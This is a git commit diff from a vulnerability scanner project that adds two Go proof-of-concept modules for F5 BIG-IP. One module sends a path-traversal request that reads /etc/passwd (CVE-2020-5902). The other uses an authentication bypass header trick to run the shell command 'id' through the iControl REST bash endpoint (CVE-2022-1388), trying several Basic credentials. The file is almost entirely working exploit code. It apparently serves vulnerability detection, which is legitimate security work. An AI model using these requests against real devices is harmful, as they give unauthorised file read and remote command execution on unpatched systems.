9e858aa55beab9937c43277f1db9373187419347
51pwn <51pwn@51pwn.com>
2022-06-21 07:59:48 +0800

    fix #6 2022-06-21 07:59:1655769588

---
+++ pocs_go/f5/CVE_2020_5902.go
@@ -0,0 +1,17 @@
+package f5
+
+import (
+	"fmt"
+	"github.com/hktalent/scan4all/pkg"
+	"strings"
+)
+
+func CVE_2020_5902(u string) bool {
+	if req, err := pkg.HttpRequset(u+"/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd", "GET", "", false, nil); err == nil {
+		if req.StatusCode == 200 && strings.Contains(req.Body, "root") {
+			pkg.GoPocLog(fmt.Sprintf("Found F5 BIG-IP CVE_2020_5902|--\"%s\"\n", u))
+			return true
+		}
+	}
+	return false
+}
---
+++ pocs_go/f5/CVE_2022_1388.go
@@ -0,0 +1,44 @@
+package f5
+
+import (
+	"fmt"
+	"github.com/hktalent/scan4all/pkg"
+	"strings"
+)
+
+func CVE_2022_1388(u string) bool {
+	header1 := make(map[string]string)
+	header1["Authorization"] = "Basic YWRtaW46"
+	header1["Connection"] = "X-F5-Auth-Token, X-Forwarded-Host"
+	header1["X-F5-Auth-Token"] = "a"
+	header1["X-Forwarded-For"] = "localhost"
+	header1["Content-Type"] = "application/json"
+	header1["Referer"] = "localhost"
+	data := "{\"command\":\"run\",\"utilCmdArgs\":\"-c id\"}"
+	if req, err := pkg.HttpRequset(u+"/mgmt/tm/util/bash", "POST", data, false, header1); err == nil {
+		if req.StatusCode == 200 && strings.Contains(req.Body, "commandResult") {
+			pkg.GoPocLog(fmt.Sprintf("Found F5 BIG-IP CVE_2022_1388|--\"%s\"\n", u))
+			return true
+		} else {
+			header1["Authorization"] = "Basic ZjVodWJibGVsY2RhZG1pbjo="
+			if req, err := pkg.HttpRequset(u+"/mgmt/tm/util/bash", "POST", data, false, header1); err == nil {
+				if req.StatusCode == 200 && strings.Contains(req.Body, "commandResult") {
+					pkg.GoPocLog(fmt.Sprintf("Found F5 BIG-IP CVE_2022_1388|--\"%s\"\n", u))
+					return true
+				}
+			} else {
+				header2 := make(map[string]string)
+				header2["Authorization"] = "Basic YWRtaW46YWRtaW4="
+				header2["Connection"] = "close, X-Forwarded-Host"
+				header2["Content-Type"] = "application/json"
+				if req, err := pkg.HttpRequset(u+"/mgmt/tm/util/bash", "POST", data, false, header2); err == nil {
+					if req.StatusCode == 200 && strings.Contains(req.Body, "commandResult") {
+						pkg.GoPocLog(fmt.Sprintf("Found F5 BIG-IP CVE_2022_1388|--\"%s\"\n", u))
+						return true
+					}
+				}
+			}
+		}
+	}
+	return false
+}
